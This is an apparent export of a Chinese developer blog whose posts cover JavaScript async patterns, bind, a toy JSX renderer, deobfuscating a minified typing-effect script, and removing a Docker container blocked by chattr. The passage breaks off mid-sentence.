一般来说，抽象工厂模式适用于比较大的项目。比如可以定义一套跨平台的业务接口，让工厂来生产BO们，共同配合以实现某个功能。那么针对不同的平台，就可以有不同的工厂来屏蔽平台之间的差异。而站在客户端的角度，我们只需要结合多态来实例化目标平台的工厂类，就可以通过通用的接口来完成所需的功能。在这个过程中，尽管工厂生成的产品们联系密切，但客户端依然不需要了解产品族中各产品之间的具体差异。 这即是说，抽象工厂模式把更多的工作放到了接口实现方这边。对于“功能扩展”这项工作，抽象工厂模式可以分为产品扩展和产品族扩展两种。可以发现，产品的扩展其实违背了“开放-封闭原则”，因为它不但要修改工厂接口，还要修改每个现有的工厂实现类；而产品族的扩展则十分优雅，因为抽象工厂模式主打的就是扩展产品族嘛。","categories":[{"name":"设计模式","slug":"设计模式","permalink":"/categories/设计模式/"}],"tags":[]},{"title":"CallBack 与 Promise 与 Generator 与 async/await 的故事","slug":"AsyncJavascript","date":"2020-09-29T12:58:40.000Z","updated":"2022-12-29T05:40:57.525Z","comments":true,"path":"2020/09/29/AsyncJavascript/","link":"","permalink":"/2020/09/29/AsyncJavascript/","excerpt":"","text":"0x0 前言之前在读 express 相关的项目时经常看到 async/await 关键字，所以就跑去查了一下文档，看完以后还是觉得云里雾里；前几天偶然看到阮一峰老师的一篇文章，文章中整理了当前 Javascript 处理异步的一些方式，并作了一些对比，尤其最后在提到 async/await 时使用 Generator 去模拟其行为，顿时觉得茅塞顿开。 于是这篇文章就作为一个简单的总结+个人的一些理解，就这样开始写下去了。 0x1 关于 Javascript 的异步之前有看到所谓 “异步就是多线程” 的言论，但是在上文提到的文章中，作者把异步看作是一种可以在两个任务中互相切换（并传递信息）的一种模式（这里的任务指按顺序执行的一段序列），那么根据这个思想，其实 Generator 的模式就可以看作是一种异步，于是它在配合 Javascript 的事件循环（Event Loop）后就可以做到一些奇妙的效果，详见下文。 众所周知，Javascript 是一门单线程的语言，这句话多少都令人有些疑惑（或者可能单纯是我比较愚钝），比如像 NodeJS 的 fs.readFile ，在 CallBack 被调用前，这个 “唯一” 的线程难道还是要自己去与文件系统交互吗；或者对于 setTimeout ，这个 “唯一” 的线程难道会通过在用户的代码中插入轮询来进行计时吗。 事实上，这里所谓的单线程指的是用户代码所在的线程（这里姑且称之为主线程），而对于计时器、文件读取这类的操作，Javascript 依然有相应的线程来完成这些任务。也就是说，用户的代码并不能进入到这些线程中来执行，但是可以通过 API 来委托它们执行任务，那么就需要一种方式，使得这些线程在执行完相应的任务后能通知到主线程，对于这种方式，首先能想到的就是 CallBack。 0x2 关于 CallBackCallBack 并不是专门用来解决异步问题的，它只是一个被作为参数传递给另一个函数的函数，这样看来其实像 Decorator 这种的都可以算作是一种 CallBack。 回到异步的话题上，在 Javascript 的一种异步模式中，CallBack 用于告知对应的任务线程，在执行完主线程分发的任务后调用之，从而让执行流回到主线程中。比如前文所述的 readFile，对应的代码大概如下: 1234const &#123; readFile &#125; = require('fs')readFile(..., (err, data) =&gt; &#123; ...&#125;) 这里 readFile 的第二个参数就是一个 CallBack，它委托与文件系统交互的线程去读取由第一个参数指明的文件。在它执行任务的期间，有可能成功也有可能失败，所以 NodeJs 大部分的 CallBack 的第一个参数都用来记录错误，后面的则用来处理成功后获取到的数据，在我看来这是一个非常优雅的模式，它并没有什么心智负担，写起来非常自然。 但是一旦异步的操作有了前后的顺序依赖，事情就变得不尽人意了，鼎鼎大名的回调地狱（CallBack Hell）就是由此产生的，还是之前读文件的例子，比如业务一定要按照 file1 -&gt; file2 -&gt; file3 -&gt; ... 这样的顺序来进行的话，那么回调就会一层套用一层，最终的结果是代码变得横向发展，这是十分不美观且难以维护的状态。 于是 Promise 出现了。 0x3 关于 PromisePromise 其实是一种新的回调模式，网络上有大量相关的 polyfill，看一下代码就可以明白内部的基本原理（这里特别推荐一下 yaku 这个库，贺老曾对此有过很高的评价）。 这里额外说明一件事，就是虽然 Promise 在大部分的实现里都以微任务来执行，但是标准中并没有提及这件事，以至于我见过的 polyfill 基本都是用 setTimeout 来模拟的，所以在写业务的时候其实不能过分依赖这一点。 回到上面的异步顺序依赖的问题，对于那种逻辑，如果用 CallBack 来写的话，大概是这个样子: 1234567891011121314151617181920212223const &#123; readFile &#125; = require('fs')readFile('file1', (err, data) =&gt; &#123; if (err) &#123; ... &#125; console.log(`File1 content: $&#123;data&#125;`) readFile('file2', (err, data) =&gt; &#123; if (err) &#123; ... &#125; console.log(`File2 content: $&#123;data&#125;`) readFile('file3', (err, data) =&gt; &#123; if (err) &#123; ... &#125; console.log(`File3 content: $&#123;data&#125;`) readFile('...', (err, data) =&gt; &#123; ... &#125;) &#125;) &#125;)&#125;) 这里仅仅读取了三个文件，代码的缩进就已经到了很深的程度了，而且冗余性特别大，尽管对于这个样例，错误处理的逻辑可能是完全一样的，每个回调对应的错误还是要分别处理。 而同样的逻辑，如果用 Promise 写出来是这样的: 1234567891011121314151617const &#123; readFile &#125; = require('fs').promisesreadFile('file1', &#123; encoding: 'utf8' &#125;).then(data =&gt; &#123; console.log(`File1 content: $&#123;data&#125;`) return readFile('file2', &#123; encoding: 'utf8' &#125;)&#125;).then(data =&gt; &#123; console.log(`File2 content: $&#123;data&#125;`) return readFile('file3', &#123; encoding: 'utf8' &#125;)&#125;).then(data =&gt; &#123; console.log(`File3 content: $&#123;data&#125;`)&#125;).catch(err =&gt; &#123; ...&#125;) 可以看到，Promise 很优雅地解决了上面说的两个问题，拯救被回调地狱折磨的前辈们于水火之中。 0x4 更进一步虽然 Promise 很优雅，可以很好地解决上面提到的问题，但是一个是因为程序员比较懒，一个是因为 Promise 写多了确实有点烦，所以大家就又开始找新的解决顺序依赖的方式。 先说为什么比较烦，上面的例子因为逻辑很简单，而且只有三个显式的顺序依赖所以可能不太明显，但是想象一下如果顺序很多，那么代码里基本上全是 then then then，一个是放眼望去基本看不出主要的逻辑，另一个是…顺序依赖其实是一个挺大众的需求，如果有一个语法糖能提供更好的支持，那真的是一件令人高兴的事情。 于是我们的主角就出场了，它叫 await ，平时只喜欢和 async 待在一起，对于具体的用法稍稍 STFW 一下就有很多，所以我比较想从 Generator + Promise 的角度来描写它，那么下面就先来说一下 Generator。 0x5 关于 GeneratorGenerator 这个概念（机制）也不是 Js 这门语言独有的，比如 Python 中就有同样的机制。在 Js 中，一个 Generator 是一个带星号的函数，内部可以通过 yield 关键字来“送出”和“接收”数据，它大概长下面的样子，这里就不详细介绍它了，具体的机制可以看相关的文档。 123456789function *ImaGenerator () &#123; const data = yield \"Send data from generator\" console.log(\"Get data from main:\", data)&#125;const gen = ImaGenerator()console.log(\"Get data from generator:\", gen.next().value)gen.next(\"Send data from main\") 可能是由于代码量比较少，平时写的时候还没用实际到过这项技术，不过我还是比较感谢曾经学习了它的自己，让我能够借助它来更好地理解 async/await。 前面说过，异步可以被理解成是一种在两个顺序流程之间切换并传递信息的运行模式，那么如果把这个思想落实到 Generator 上就可以发现，yield 关键字既可以让流程从 Generator 中切换到外部执行流，又可以携带特定的信息；next 方法在另一方面使得流程回到 Generator 中成为可能。 于是，通过观察前面 CallBack 和 Promise 阅读文件的例子，就可以发现其具备特定的规律，从而结合 Generator 写出如下的代码： 123456789101112131415161718192021222324252627282930313233// callback + generator 的例子function Thunkify (fn) &#123; return function argExceptCb (...args) &#123; return function argIncludeCb (cb) &#123; fn.call(fn, ...args, cb) &#125; &#125;&#125;const fs = require('fs')const readFile = Thunkify(fs.readFile)function *readFiles (...filenames) &#123; for (fn of filenames) &#123; const content = yield readFile(fn) console.log(content) &#125;&#125;function runThunkifyGen (gen) &#123; function next (err, data) &#123; const ret = gen.next(data) if (ret.done) return ret.value(next) &#125; next()&#125;runThunkifyGen(readFiles('file1', 'file2', 'file3'))console.log('Read done') 123456789101112131415161718192021// promise + generator 的例子const &#123; readFile &#125; = require('fs').promisesfunction autorun (gen) &#123; (function next (data) &#123; const ret = gen.next(data) if (ret.done) return ret.value.then(data =&gt; next(data.toString())) &#125;)()&#125;function *readFiles (...filenames) &#123; for (fn of filenames) &#123; const content = yield readFile(fn) console.log(content) &#125;&#125;autorun(readFiles('file1', 'file2', 'file3'))console.log(\"Read done\") 例子中的 autorun 和 runThunkifyGen 函数被称为 执行器，用于自动将流程在 Generator 和调用方之间切换，并保证读取的文件顺序。 可以看到，实际上执行器就是提取出了 callback 和 then 的部分，在这里用户需要关注的只有 readFiles 这一个函数，而两个例子中，readFiles 长得一模一样。 那么如果我们把目光着眼于更一般的场景，是否可以结合 Generator 和执行器来让其达到普适呢？答案是可以的，下面给出代码： 12345678910111213141516171819function async (fn) &#123; function step (gen, data) &#123; try &#123; var next = gen.next(data) &#125; catch (err) &#123; return Promise.reject(err) &#125; return next.done ? Promise.resolve(next.value) : Promise.resolve(next.value) .then(data =&gt; step(gen, data)) &#125; return function () &#123; const gen = fn() return step(gen) &#125;&#125; async 函数接受一个 Generator，然后返回一个新的函数，这个函数在内部递归调用 step，这个 step 其实就是执行器（其实可以通过 IIFE 使得 step 变成单例，不过这里就不考虑这些了）。 和上面不同的地方在于，前面的两个都分别假定了 yield 后面跟随的要么是一个 thunk，要么是一个promise，而 async 则支持 yield 后面跟随一般值，能做到这一点的原因在于 Promise.resolve 和 Promise.reject ，其具体的机制可以查看MDN。 那么该如何使用 async 呢，继续回到之前按顺序打开并读取文件的例子，我们的代码会变成这样： 12345678910const &#123; readFile &#125; = require('fs').promises const func1 = async(function *() &#123; const data1 = yield readFile('file1') const data2 = yield readFile('file2') const data3 = yield readFile('file3') console.log('data1:', data1.toString()) console.log('data2:', data2.toString()) console.log('data3:', data3.toString())&#125;) 已经对 async/await 有所了解的小伙伴可以发现，同样的逻辑，如果使用这一对新人，则代码会变成这样： 12345678910const &#123; readFile &#125; = require('fs').promisesconst func2 = async function() &#123; const data1 = await readFile('file1') const data2 = await readFile('file2') const data3 = await readFile('file3') console.log('data1:', data1.toString()) console.log('data2:', data2.toString()) console.log('data3:', data3.toString())&#125; 很相似，对吧？","categories":[{"name":"前端","slug":"前端","permalink":"/categories/前端/"}],"tags":[]},{"title":"一个关于 script 标签的 type 属性的另类用法","slug":"ScriptType","date":"2020-09-25T13:33:18.000Z","updated":"2022-12-29T05:40:57.525Z","comments":true,"path":"2020/09/25/ScriptType/","link":"","permalink":"/2020/09/25/ScriptType/","excerpt":"","text":"0x00 前言今天出于好奇跑去 React 官网转了一圈，看到里面提供了一个 无需构建工具 的体验例子，看到代码后感觉很神奇，因为它直接在 script 里的 render 函数中写入了 JSX ，并且成功渲染到了视图里，但是这种语法显然不是被允许的，红色的 Uncaught SyntaxError: expected expression, got &#39;&lt;&#39; 是应该出现在 console 中的。 0x01 原理及实现思来想去，突然发现 script 中的 type 标签里并不是常规的 text/javascript ，而是非标准的 text/babel ，那么这个东西有什么影响呢？ 其实把这段代码复制到一个带语法高亮的编辑器中应该就能看到异样了，比如扔进我本地使用的 vscode 时就可以发现，script 标签中并没有提供语法高亮和代码补全功能。 STFW 后得知，对于这种 type ，浏览器不会将其看作将被执行的 script ，而是当作普通的标签元素来看待，而既然这里的 type 是 babel，上面的 script:src 也引入了 babel ，那么想来编译并执行这段纯文本就是它的工作了。 知道了这个原理后，就可以写出简单的渲染方法了，代码如下： 1234567891011121314151617181920212223242526272829&lt;!-- HTML 文件 --&gt;&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;title&gt;Render-Test&lt;/title&gt; &lt;script src=\"render.js\"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=\"app\"&gt;&lt;/div&gt; &lt;script type=\"text/react\"&gt; console.log(\"Output msg to console\") render( &lt;div&gt; &lt;h1&gt;Hello, React!&lt;/h1&gt; &lt;spanInputBox&lt;/span&gt; &lt;input type=\"text\"&gt; &lt;button onclick=\"alert('Hello!')\"&gt;clickMe&lt;/button&gt; &lt;/div&gt;, document.getElementById('app') ) &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; render.js 文件内容如下： 1234567891011121314151617window.onload = function () &#123; const pattern = /\\s*render\\s*\\(\\s*(&lt;.+&gt;)/gs const scriptList = document.querySelectorAll('script[type=\"text/react\"]') globalThis.render = function (template, node) &#123; node.innerHTML = template &#125; for (let script of scriptList) &#123; eval(script.textContent.replaceAll( pattern, (_, template) =&gt; `;render(\\`$&#123;template&#125;\\`` )) &#125;&#125; 大概思路就是找到所有 type 相符的 script 标签，给 jsx 的部分加上引号，然后把整坨内容扔进 eval 里跑一下，当然现实中肯定不会这么简单粗暴，这里只能说是一个 POC 吧。 0x02 总结没什么总结的，就是闲着没事水了一篇博客而已（","categories":[{"name":"前端","slug":"前端","permalink":"/categories/前端/"}],"tags":[]},{"title":"测试 Github Actions","slug":"GitActionsTest","date":"2020-09-03T06:15:11.000Z","updated":"2022-12-29T05:40:57.525Z","comments":true,"path":"2020/09/03/GitActionsTest/","link":"","permalink":"/2020/09/03/GitActionsTest/","excerpt":"","text":"Congratulations to myself :-)","categories":[{"name":"杂项","slug":"杂项","permalink":"/categories/杂项/"}],"tags":[]},{"title":"记一次手贱的经历与解决办法","slug":"Docker-Chattr","date":"2020-09-01T02:01:35.000Z","updated":"2022-12-29T05:40:57.525Z","comments":true,"path":"2020/09/01/Docker-Chattr/","link":"","permalink":"/2020/09/01/Docker-Chattr/","excerpt":"","text":"0x0 起因一直以来对 Linux 的权限管理都仅仅停留在 “知道有这种机制存在” 的程度上，最近为某比赛出题时因为要有 getshell 的环境，所以就趁机了解了一下其中的一些理论和对应的命令。 由于我本人平时使用的是 MacOS 系统，再加上赛题环境也要扔到 docker 中，所以在学习权限管理时在 docker 里开了一个容器作为环境，测试的命令包括 chown，chroot，lsattr，chattr… 等等（这里插一句题外话，为了在容器中运行 chattr ，需要在启动时加上 --cap-add LINUX_IMMUTABLE 参数来为其赋予一个 capability ），在了解到可以开始创建赛题环境的程度后，我退出了容器，并运行了 docker rm ... 来将测试用的容器删除掉。 正当我准备开始输入命令创建新的容器时，却看到 docker 并没有正常删除测试用容器，取而代之地返回了一条蜜汁信息（这里省略了容器对应的两个哈希，该哈希对应我上文提到的那个用于测试权限管理的容器）： 1Error response from daemon: container ...: driver \"overlay2\" failed to remove root filesystem: unlinkat /var/lib/docker/overlay2/.../diff/test/file: operation not permitted 可以看到，大意是 docker 没有权限删除容器中的 /test/file 文件，比较幸运地，我记得这个文件是经历了 chattr +a file 处理后的文件，这个隐藏属性使得文件只可被追加新的内容而不可被删除或者修改。 起初我觉得这个问题很好解决（实际也很好解决，只不过和我开始想的不同），如果是在 docker for linux 上，直接在宿主机切到对应的目录后运行 chattr -a file 去掉隐藏属性，然后继续运行 docker rm ... 删掉容器即可；docker for macos 无非就是多了一层 HyperKit，可以用 screen 进入到 vm 中（我本机上是 screen ~/Library/Containers/com.docker.docker/Data/vms/0/tty），然后进行和上文相同的操作。 然而进去才发现，这个 vm 提供的命令太少了，根本没有 chattr 命令可用，尝试搜索是否有等效的命令可用也没有搜到，更没有人手贱到和我一样，所以现在的场景也没有先人的经验可以学习。虽然这一个容器本身并没有占多大的空间，但是强迫症使然，我还是想把它删除掉:-P 0x1 解决办法0x10 Hard Reset最初我尝试自己在 StackOverflow 上提出了这一问题，然而也不知道是因为环境描述的不到位还是因为自己小学水平的英文写作能力，下面的答复甚至都没有对应到这个问题上… 只有一位老哥给了还算靠谱的答复，他建议我强制重置 docker desktop for mac 的状态（Troubleshoot/Reset disk image 或者 Troubleshoot/Reset to factory defaults），这俩都会清空当前的所有的镜像和容器，后者还会顺手把应用重置成刚被安装后的状态。 确实是一个解决办法，不过因为我平时都是把 docker 当虚拟机用的，所以本机上存着各种镜像，其中还包括好多自定制的，一个一个导出来实在是太过麻烦，而我又不怎么了解这些镜像是怎么个存储机制，胡乱备份的话还担心弄出别的问题，所以就放弃了这个办法。 0x11 Chroot在 vm 里畅游了一阵子后，我偶然发现这货还是有 chroot 可以用的，于是随便切到一个包含根目录的容器层里（我本机的路径是 /var/lib/docker/overlay2/.../diff ，这里依然省略了哈希），试着执行了一下 chroot . /bin/bash ，虽然给了一条 groups: cannot find name for group ID 11 的奇怪信息，不过还是顺利地进入到了 bash 环境中，而且测试了一下后发现 chattr 命令可用。 这样的话就好办多了，在无法删除的文件所在的文件夹或父文件夹中构建出 chattr 的运行环境，然后利用 chroot 运行 chattr -a file 来删除文件的隐藏属性，再在宿主机中运行 docker rm ... 即可 在其他容器中（下文用 other 来指代）用 ldd 查看下 chattr 依赖的动态链接库，得到结果如下： 1234567root@docker-desktop:/# ldd $(which chattr) linux-vdso.so.1 (0x00007ffebb9fc000) libe2p.so.2 =&gt; /lib/x86_64-linux-gnu/libe2p.so.2 (0x00007f6ce8b0a000) libcom_err.so.2 =&gt; /lib/x86_64-linux-gnu/libcom_err.so.2 (0x00007f6ce8906000) libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f6ce8515000) libpthread.so.0 =&gt; /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f6ce82f6000) /lib64/ld-linux-x86-64.so.2 (0x00007f6ce8f17000) 可以看到依赖库都在 /lib/x86_64-linux-gnu/ 和 /lib64/ 文件夹中，所以在目标文件夹（这里指无法删除的文件 file 所在的文件夹）中用 cp -R 把 other 中这两个文件夹中的内容拷贝过来，再把 chattr 的 ELF 文件拷到目标文件夹中，最后在目标文件夹中运行 chroot . ./chattr -a file 即可。 删除了隐藏属性后，切回到宿主机中，然后运行 docker rm ... 就可以顺利删除掉这个出了问题的容器了。","categories":[{"name":"Docker","slug":"Docker","permalink":"/categories/Docker/"}],"tags":[]},{"title":"CTF练习集","slug":"CTF-Exercises","date":"2020-08-04T03:50:11.000Z","updated":"2022-12-29T05:40:57.525Z","comments":true,"path":"2020/08/04/CTF-Exercises/","link":"","permalink":"/2020/08/04/CTF-Exercises/","excerpt":"","text":"window.location = \"https://www.cnblogs.com/yuren123/\" 如果看到这段话，说明自动跳转没有作用，请访问链接","categories":[{"name":"CTF","slug":"CTF","permalink":"/categories/CTF/"}],"tags":[]},{"title":"函数 Function.prototype.bind 的几个场景","slug":"FunctionBind","date":"2020-08-04T01:54:30.000Z","updated":"2022-12-29T05:40:57.525Z","comments":true,"path":"2020/08/04/FunctionBind/","link":"","permalink":"/2020/08/04/FunctionBind/","excerpt":"","text":"0x0 前言一直以来都没想到 bind 函数的具体应用场景，最近读某源码时偶然在一个类声明中看到了下面第一个场景中的代码，由此联想到了一些其他内容，这里记录一下 0x1 第一个场景相关的核心代码如下 1234// 类名为 Directivethis._update = function (val) &#123; this.update(val) //该方法同样被定义在该类中，用于更新属性，这里因篇幅原因不给出&#125;.bind(this) 该方法在这个类之后的代码中被作为回调函数传给了另一个 Watcher 对象，代码如下 1var watcher = this._watcher = new Watcher(..., this._update) 这个 Watcher 对象将 _update 函数作为一个属性保存在了自己的作用域中，并在用户触发相应的事件后执行回调。 这个场景下的本意是 Watcher 在监测到事件发生后调用 Directive._update 方法来更新对应的 Directive 实例中的属性，然而我们知道，Javascript 中的 this 是会根据上下文进行变化的（这里不考虑箭头函数等特殊情况），当 Watcher 把 _update 作为自己的属性时，这个 this 就从 Directive 变成 Watcher 了，之后的更新也都会发生在 Watcher 中，这显然偏离了本意。 而 bind 的作用在于，它强制绑定了代码中 this 的值，使这个函数在赋值给其他对象作为属性且通过该对象进行调用时依然以 bind 中的参数作为 this ，在这里就达到了场景本身的需求。 0x2 第二个场景上面的例子并不是一个经常会遇到的场景，下面给出一个更普遍一些的情况：假设我们在视图中有一系列按钮通过绑定事件来操作一个 Object 中的属性，由于在 js 的逻辑中也有可能用到同样的属性操作，所以这些操作可以作为该对象的方法，然后将该方法作为回调函数传给对应的 Listener ，代码大概如下 12345678910// 这段代码因为没有具体上下文所以可能显得有些刻意，不过足够说明问题本身了let runTime = new (function() &#123; this.data = 0 this.addData = function() &#123; this.data++; &#125;&#125;)();let btn = document.querySelector('#btn-addData');btn.onclick = runTime.addData; 这里试图在点击一个按钮后将 runTime.data 自增，在将回调函数绑定到 click 事件时使用了 btn.onclick = runTime.addData 这样的语句，然而需要注意的是，在绑定后，addData 中的 this 就不再是 runTime ，而是 btn 了，这样在点击后就会尝试递增 btn.data ，从而偏离了本意。 正确的做法和前面的例子一样，应该在 addData 的函数定义后加入 .bind(this) 语句，从而将 this 强制绑定为 runTime 对象。 0x3 第三个场景另外上面给出的 MDN 的链接中也有几个场景，不过我认为其中受用面最大的应该是 “快捷调用” 的场景，这里为了查阅方便来转述一下 场景的意图在于给经常调用的长对象方法提供一个捷径，比如想通过 Array.prototype.slice 来将一个类数组对象转换为真正的数组时，常规写法可能是 123var slice = Array.prototype.slice...slice.apply(arguments) 但是当这个函数需要经常被调用时，slice.apply 的写法还是有些令人厌烦，这时可以利用 bind 来将 apply 的 this 绑定为 Array.prototype.slice（这个 this 指的是 “apply 作为谁的方法被调用” 中的 “谁” 而不是 apply 的第一个参数），从而通过直接调用绑定后的函数（包装函数）来达到目的，代码如下 123var slice = Function.prototype.apply.bind(Array.prototype.slice)...slice(arguments) 这样就缩短了调用方法时所需的长前缀，写起来就能更愉快一些。","categories":[{"name":"前端","slug":"前端","permalink":"/categories/前端/"}],"tags":[]},{"title":"记一段 Js 代码的解读与思考","slug":"JS-Inspection","date":"2019-12-11T08:30:23.000Z","updated":"2022-12-29T05:40:57.525Z","comments":true,"path":"2019/12/11/JS-Inspection/","link":"","permalink":"/2019/12/11/JS-Inspection/","excerpt":"","text":"0x0 前言最近逛别人博客的时候，偶然看到了下面这货： 立刻就被这个简约的小东西给吸引住了，于是对着它就是一发审查元素，想看看其具体的实现，在把主要的部分提取出来后得到如下内容： 1234567891011121314&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Test&lt;/title&gt; &lt;meta charset=\"utf8\"&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=\"binft\"&gt;&lt;/div&gt; &lt;script&gt; var binft=function(e)&#123;function m(a)&#123;for(var d=document.createDocumentFragment(),c=0;a&gt;c;c++)&#123;var b=document.createElement(\"span\");b.textContent=String.fromCharCode(94*Math.random()+33);b.style.color=f[Math.floor(Math.random()*f.length)];d.appendChild(b)&#125;return d&#125;function g()&#123;var d=h[a.skillI];a.step?a.step--:(a.step=k,a.prefixP&lt;b.length?(0&lt;=a.prefixP&amp;&amp;(a.text+=b[a.prefixP]),a.prefixP++):\"forward\"===a.direction?a.skillP&lt;d.length?(a.text+=d[a.skillP],a.skillP++):a.delay?a.delay--:(a.direction=\"backward\",a.delay=l):0&lt;a.skillP?(a.text=a.text.slice(0,-1),a.skillP--):(a.skillI=(a.skillI+1)%h.length,a.direction=\"forward\"));e.textContent=a.text;e.appendChild(m(a.prefixP&lt;b.length?Math.min(c,c+a.prefixP):Math.min(c,d.length-a.skillP)));setTimeout(g,n)&#125;var b=\"\",h=\"\\u9752\\u9752\\u9675\\u4e0a\\u67cf\\uff0c\\u78ca\\u78ca\\u6da7\\u4e2d\\u77f3\\u3002 \\u4eba\\u751f\\u5929\\u5730\\u95f4\\uff0c\\u5ffd\\u5982\\u8fdc\\u884c\\u5ba2\\u3002 \\u6597\\u9152\\u76f8\\u5a31\\u4e50\\uff0c\\u804a\\u539a\\u4e0d\\u4e3a\\u8584\\u3002 \\u9a71\\u8f66\\u7b56\\u9a7d\\u9a6c\\uff0c\\u6e38\\u620f\\u5b9b\\u4e0e\\u6d1b\\u3002 \\u6d1b\\u4e2d\\u4f55\\u90c1\\u90c1\\uff0c\\u51a0\\u5e26\\u81ea\\u76f8\\u7d22\\u3002 \\u957f\\u8862\\u7f57\\u5939\\u5df7\\uff0c\\u738b\\u4faf\\u591a\\u7b2c\\u5b85\\u3002 \\u4e24\\u5bab\\u9065\\u76f8\\u671b\\uff0c\\u53cc\\u9619\\u767e\\u4f59\\u5c3a\\u3002 \\u6781\\u5bb4\\u5a31\\u5fc3\\u610f\\uff0c\\u621a\\u621a\\u4f55\\u6240\\u8feb\\uff1f\".split(\" \").map(function(a)&#123;return a+\"\"&#125;),l=2,k=1,c=5,n=75,f=\"rgb(110,64,170) rgb(150,61,179) rgb(191,60,175) rgb(228,65,157) rgb(254,75,131) rgb(255,94,99) rgb(255,120,71) rgb(251,150,51) rgb(226,183,47) rgb(198,214,60) rgb(175,240,91) rgb(127,246,88) rgb(82,246,103) rgb(48,239,130) rgb(29,223,163) rgb(26,199,194) rgb(35,171,216) rgb(54,140,225) rgb(76,110,219) rgb(96,84,200)\".split(\" \"),a=&#123;text:\"\",prefixP:-c,skillI:0,skillP:0,direction:\"forward\",delay:l,step:k&#125;;g()&#125;;binft(document.getElementById('binft')); &lt;/script&gt;&lt;/body&gt; 其中 js 的部分经历了压缩，随便找了个在线解压工具尝试格式化后，终于获得了一份勉强能看的代码。而由于最近刚刚了解了 js 混淆的含义与作用，这份代码又刚好经过了不太难的混淆处理，故准备拿它开刀，尝试自己分析一下。 0x1 相关问题0x10 恼人的条件表达式首先比较麻烦的就是 1a.step ? a.step--:(a.step = k, a.prefixP &lt; b.length ? (0 &lt;= a.prefixP &amp;&amp; (a.text += b[a.prefixP]), a.prefixP++) : \"forward\" === a.direction ? a.skillP &lt; d.length ? (a.text += d[a.skillP], a.skillP++) : a.delay ? a.delay--:(a.direction = \"backward\", a.delay = l) : 0 &lt; a.skillP ? (a.text = a.text.slice(0, -1), a.skillP--) : (a.skillI = (a.skillI + 1) % h.length, a.direction = \"forward\")) 这一坨迷之表达式了，对我而言非常有必要将其转换成普通的 if-else 语句，于是尝试 STFW 后得到如下三只： OpenGG 的 转换工具(会转成 IIFE) raybb 的 转换工具(需要用空格分隔关键字) website-dev.eu 的转换工具(需要科学上网，或手动换源) 然而如上所述，三位前辈的工具都有着各自的问题，先抛开 IIFE 的可读性不说，后面两只并没有支持诸如 1?(2?3:4,3?4:5):6 这样的平行语句，因此并不能处理上面的表达式，考虑到未来可能还会有类似的需求，故以解决上述情况为主要目标，掏出 Python 一顿乱敲产出了如下脚本（TL;DR）： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374# 引号中输入想要处理的内容tmp = \"\"# 预处理 删除所有空格 方便后面判断左右是否有括号tmp = tmp.replace(' ', '')# 将一组语句在考虑括号的前提下以逗号再分组def getSplitContent(tmp): balance = 0 indexs = [] words = [] for i in range(len(tmp)): if tmp[i] == '(': balance += 1 elif tmp[i] == ')': balance -= 1 elif tmp[i]==',' and balance==0: indexs.append(i) # 手动切分 因为 str 是不可变对象 暂时没有好办法 i = -1 for j in indexs: words.append(tmp[i+1:j]) i = j else: words.append(tmp[i+1:]) return words# 获得 tmp 中和 ? 匹配的 : 符号def getIndex(tmp): balance = 0 for i in range(len(tmp)): if tmp[i] == '?': balance += 1 elif tmp[i] == ':': balance -= 1 if balance == 0: return i else: return -1def fun(input, n=0): if input.startswith('(') and input.endswith(')'): input = input[1:-1] tab = ' '*n splitTmp = getSplitContent(input) for tmp in splitTmp: # 没找到则说明当前语句不可再分 left = tmp.find('?') if left == -1: print(\"%s%s;\"%(tab, tmp)) continue # 没找到则说明条件表达式不完整 right = getIndex(tmp) if right == -1: print(\"Error\") exit() # 打印当前层的 if-else 语句并递归处理子句 print(\"%sif (%s) &#123;\"%(tab, tmp[:left])) fun(tmp[left+1:right], n+1) print('%s&#125; else &#123;'%tab) fun(tmp[right+1:], n+1) print('%s&#125;'%tab)fun(tmp) 主要思路比较简单，就是以括号为基准挑选出可作为分隔符的逗号，并以此对语句进行分组后再递归处理，唯一比较坑的地方是 python 中 str 属于不可变对象，因此这里只好采用记录下标并手动拆分的办法= = 同时，受上面前辈的启发，觉得可以在博客里开个 杂项 的板块，里面放一些小脚本等与博客本身没什么关系的东西，这样既方便日后的使用，也可以作为一种练习，嗯，可喜可贺。 把上面的一坨表达式丢进脚本里，再用运行后的结果替换之，可以发现这个名为 g 的函数就是逻辑的主要部分了。 0x11 setTimeout 以及 js 事件循环机制结束替换的工作后，就可以开始读代码了。考虑到实际的效果，能够猜到代码里包含着类似循环的部分，可是尝试搜索 for 和 while 时都没有找到任何内容。在仔细阅读后，终于发现在上面转换出来的 g 函数里静静地躺着一只 setTimeout(g, n) ，想来它就是我们的目标了。 可是很奇怪，之前在 w某school 和 某鸟 中了解到该函数只是设置一个表达式在多少毫秒后执行（因为没有实际用过我一直以为是像 sleep 一样的东西），那么如果把它放在这个地方，为什么不会因为无限递归而爆栈呢？ 继续 STFW 后，终于得到答案，这里为了方便日后回忆以及防止链接挂掉，简单地总结一下： 首先要明确的，是 js 本身是一个 单线程 的语言，但是为了更好地处理网页中日渐庞大的静态资源，其提供了 同步任务 和 异步任务 两种机制。在实际执行时，同步任务进入主线程，而异步任务进入 EventTable 并注册回调函数，在指定的事情完成后，EventTable 会将这个函数移入 EventQueue；当 js 的 monitoring process 进程发现主线程空栈后就会去 EventQueue 中读取对应的函数并执行，这个过程一直持续到所有的任务被完成。 而除了广义的 同步 与 异步，在精细定义下任务还可以被分成 宏任务(macro-task) 和 微任务(micro-task) ，前者包括整体代码，setTimeout，setInterval，后者包括 Promise，process.nextTick 等等；不同的任务在执行时会以这两种任务为基准进入对应的 EventQueue ，并交替运行直至所有任务被完成。 而 setTimeout 函数中用来表示时间的参数，实际上指的是经过多少毫秒后将任务从 EventTable 转移到宏任务的 EventQueue 中，所以影响实际时间的因素其实还挺多的，完全不是 w某school 和 某鸟 中说的那样= = 据说这一点在前端的面试题中屡见不鲜，以后有时间可以找一找相关的内容。 回到正题，由于这里把函数调用放到了所有语句的最后，所以时间上基本没什么偏差；而之所以以这种方式实现，是因为 js 